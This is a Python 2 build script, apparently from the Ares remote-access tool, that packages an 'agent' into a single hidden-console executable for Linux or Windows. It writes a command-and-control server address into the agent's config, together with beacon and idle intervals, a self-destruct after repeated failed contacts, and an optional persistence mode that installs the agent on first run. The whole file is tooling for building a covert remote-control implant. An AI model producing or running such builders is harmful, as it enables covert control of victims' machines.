#!/usr/bin/env python2

import os
import shutil
import tempfile


def build_agent(output, server_url, platform, hello_interval, idle_time, max_failed_connections, persist):
    prog_name = os.path.basename(output)
    platform = platform.lower()
    if platform not in ['linux', 'windows']:
        print "[!] Supported platforms are 'Linux' and 'Windows'"
        exit(0)
    if os.name != 'posix' and platform == 'linux':
        print "[!] Can only build Linux agents on Linux."
        exit(0)
    working_dir = os.path.join(tempfile.gettempdir(), 'ares')
    if os.path.exists(working_dir):
        shutil.rmtree(working_dir)
    agent_dir = os.path.dirname(__file__)
    shutil.copytree(agent_dir, working_dir)
    with open(os.path.join(working_dir, "config.py"), 'w') as agent_config:
        with open(os.path.join(agent_dir, "template_config.py")) as f:
            config_file = f.read()
        config_file = config_file.replace("__SERVER__", server_url.rstrip('/'))
        config_file = config_file.replace("__HELLO_INTERVAL__", str(hello_interval))
        config_file = config_file.replace("__IDLE_TIME__", str(idle_time))
        config_file = config_file.replace("__MAX_FAILED_CONNECTIONS__", str(max_failed_connections))
        config_file = config_file.replace("__PERSIST__", str(persist))
        agent_config.write(config_file)
    cwd = os.getcwd()
    os.chdir(working_dir)
    shutil.move('agent.py', prog_name + '.py')
    if platform == 'linux':
        os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
        agent_file = os.path.join(working_dir, 'dist', prog_name)
    elif platform == 'windows':
        if os.name == 'posix': 
            os.system('wine C:/Python27/Scripts/pyinstaller --noconsole --onefile ' + prog_name + '.py')
        else:
            os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
        if not prog_name.endswith(".exe"):
            prog_name += ".exe"
        agent_file = os.path.join(working_dir, 'dist', prog_name)
    os.chdir(cwd)
    os.rename(agent_file, output)
    shutil.rmtree(working_dir)
    print "[+] Agent built successfully: %s" % output


def main():
    from argparse import ArgumentParser
    parser = ArgumentParser(description="Builds an Ares agent.")
    parser.add_argument('-p', '--platform', required=True, help="Target platform (Windows, Linux).")
    parser.add_argument('--server', required=True, help="Address of the CnC server (e.g http://localhost:8080).")
    parser.add_argument('-o', '--output', required=True, help="Output file name.")
    parser.add_argument('--hello-interval', type=int, default=1, help="Delay (in seconds) between each request to the CnC.")
    parser.add_argument('--idle-time', type=int, default=60, help="Inactivity time (in seconds) after which to go idle. In idle mode, the agent pulls commands less often (every <hello_interval> seconds).")
    parser.add_argument('--max-failed-connections', type=int, default=20, help="The agent will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
    parser.add_argument('--persistent', action='store_true', help="Automatically install the agent on first run.")
    args = parser.parse_args()

    build_agent(
        output=args.output,
        server_url=args.server,
        platform=args.platform,
        hello_interval=args.hello_interval,
        idle_time=args.idle_time,
        max_failed_connections=args.max_failed_connections,
        persist=args.persistent)


if __name__ == "__main__":
    main()